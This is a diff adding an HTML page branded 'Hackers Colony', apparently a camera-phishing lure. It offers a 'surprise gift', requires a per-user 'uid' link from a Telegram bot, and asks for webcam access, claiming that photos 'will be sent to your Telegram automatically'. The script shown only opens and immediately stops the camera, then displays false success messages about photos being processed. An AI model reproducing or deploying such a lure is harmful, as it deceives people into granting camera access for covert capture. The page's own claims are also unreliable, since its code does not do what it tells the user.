@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🎁 Hackers Colony - Surprise Gift</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            background: #0b0014;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            max-width: 400px;
+            padding: 30px;
+            background: #1a0030;
+            border-radius: 20px;
+            border: 2px solid #ff00ff;
+            box-shadow: 0 0 30px #ff00ff;
+        }
+        h1 {
+            color: #ff00ff;
+            margin: 0 0 20px 0;
+            font-size: 28px;
+        }
+        p {
+            color: #ddd;
+            line-height: 1.5;
+            margin: 10px 0;
+        }
+        button {
+            background: #ff00ff;
+            color: black;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 10px;
+            cursor: pointer;
+            margin: 20px 0;
+            font-weight: bold;
+            width: 100%;
+        }
+        a {
+            color: #00ffff;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .step {
+            background: rgba(255,255,255,0.1);
+            padding: 12px;
+            border-radius: 10px;
+            margin: 10px 0;
+            text-align: left;
+        }
+        .warning {
+            color: #ff5555;
+            background: rgba(255,85,85,0.1);
+            padding: 10px;
+            border-radius: 10px;
+            margin: 15px 0;
+            border-left: 3px solid #ff5555;
+        }
+        .telegram-link {
+            display: inline-block;
+            margin-top: 15px;
+            padding: 10px 20px;
+            background: #0088cc;
+            color: white;
+            border-radius: 10px;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div style="font-size: 60px; margin-bottom: 10px;">🎁</div>
+        <h1>✨ SURPRISE GIFT ✨</h1>
+        <p>Get your personalized magic surprise from Hackers Colony!</p>
+        
+        <div class="step">
+            <strong>Step 1:</strong> Join <a href="https://t.me/HackersColony" target="_blank">@HackersColony</a>
+        </div>
+        <div class="step">
+            <strong>Step 2:</strong> Get link from <a href="https://t.me/HackersColonyBot" target="_blank">@HackersColonyBot</a>
+        </div>
+        
+        <p class="warning">⚠️ Camera access required for gift creation</p>
+        
+        <button onclick="startCamera()">🎯 START CAMERA ACCESS</button>
+        
+        <p style="font-size: 14px; color: #888; margin-top: 20px;">
+            Photos will be sent to your Telegram automatically
+        </p>
+        
+        <a href="https://t.me/HackersColonyBot" target="_blank" class="telegram-link">
+            🤖 Open Telegram Bot
+        </a>
+    </div>
+
+    <script>
+        function startCamera() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const userId = urlParams.get('uid');
+            
+            if (!userId || userId.length < 3) {
+                alert('❌ You need a valid link from @HackersColonyBot\n\n1. Open @HackersColonyBot\n2. Send /start\n3. Click "Get Your Gift"');
+                window.open('https://t.me/HackersColonyBot', '_blank');
+                return;
+            }
+            
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    // Stop camera immediately
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    // Show success message
+                    document.querySelector('.container').innerHTML = `
+                        <div style="font-size: 60px; margin-bottom: 10px;">✅</div>
+                        <h1 style="color:#00ff88;">SUCCESS!</h1>
+                        <p>Your gift is being created...</p>
+                        
+                        <div style="background: rgba(0,255,136,0.1); padding: 15px; border-radius: 10px; margin: 20px 0; border: 2px solid #00ff88;">
+                            <p style="color:#00ff88; font-weight:bold;">✅ Camera access granted</p>
+                            <p>Photos are being processed</p>
+                        </div>
+                        
+                        <div class="step">
+                            <strong>1.</strong> Check your Telegram
+                        </div>
+                        <div class="step">
+                            <strong>2.</strong> Look for messages from @HackersColonyBot
+                        </div>
+                        <div class="step">
+                            <strong>3.</strong> Your photos will arrive shortly
+                        </div>
+                        
+                        <a href="https://t.me/HackersColonyBot" target="_blank" class="telegram-link">
+                            📱 Open Telegram Now
+                        </a>
+                    `;
+                })
+                .catch(function(error) {
+                    alert('❌ Camera access denied. Please allow camera access and try again.');
+                });
+            } else {
+                alert('❌ Camera not available on this device.');
+            }
+        }
+    </script>
+</body>
+</html>
